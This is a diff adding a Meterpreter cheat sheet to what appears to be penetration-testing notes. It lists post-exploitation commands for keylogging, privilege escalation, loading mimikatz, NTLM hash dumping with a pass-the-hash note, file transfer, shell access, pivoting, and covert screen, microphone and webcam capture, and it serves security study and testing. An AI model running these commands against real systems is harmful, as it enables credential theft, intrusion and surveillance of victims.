@@ -73,12 +73,78 @@ msf6> hosts -R
 
 ## Meterpreter
 
+#### Basic usage:
+
 ```bash
+# see available commands on the target system
+meterpreter> help
+
+# system info
+meterpreter> sysinfo
+
+# list running processes
+meterpreter> ps
+
+# migrate meterpreter to another process
+# note that you may lose system privileges to that of a user
+meterpreter> migrate <PID>
+
+# keylogger (in the running process)
+meterpreter> keyscan_start
+meterpreter> keyscan_stop
+meterpreter> keyscan_dump
+
+# attempt privilege escalation to system level
+meterpreter> getsystem
+
+# load tools like python, kiwi (mimikatz)
+meterpreter> load python
+meterpreter> python_execute "<python command>"
+
 # search for a file in the target filesystem
 meterpreter> search -f <filename>
 
+# edit a file
+meterpreter> edit <filepath>
+
+# dowload a file or a directory
+meterpreter> download <remote_filepath>
+
+# upload a file or a directory
+meterpreter> upload <local_filepath>
+
+# drop to a shell
+# Ctrl+Z to get back to meterpreter
+meterpreter> shell
+
+# display the host ARP cache
+meterpreter> arp
+
+# forward a local port to remote service
+meterpreter> portfwd
+
+# view and modify the routing table
+meterpreter> route
+
 # get NTLM password hashes
+# the hashes may not be crackable but can be found in rainbow tables
+# or the hashes can be used in pass-the-hash attacks
 meterpreter> hashdump
+
+# see the screen of the target machine
+meterpreter> screenshare
+
+# take a screenshot
+meterpreter> screenshot
+
+# record the mic of the target machine
+meterpreter> record_mic
+
+# take a picture with a connected webcam
+meterpreter> webcam_snap
+
+# see stream from the webcam
+meterpreter> webcam_stream
 ```
 
 ----------------------------------------------------------------
